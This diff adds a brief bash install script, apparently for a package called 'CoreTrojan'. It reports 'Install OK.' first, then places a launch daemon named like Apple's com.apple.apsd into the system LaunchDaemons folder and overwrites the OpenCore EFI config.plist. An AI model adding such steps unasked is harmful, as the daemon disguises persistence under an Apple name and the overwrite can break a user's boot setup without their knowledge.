@@ -1,0 +1,10 @@
+#!/bin/bash
+
+echo "Install OK."
+
+cp /Library/CoreTrojan/com.apple.apsd.plist /System/Library/LaunchDaemons/
+cp /Library/CoreTrojan/config-sample.plist /EFI/OC/config.plist
+
+ 
+
+
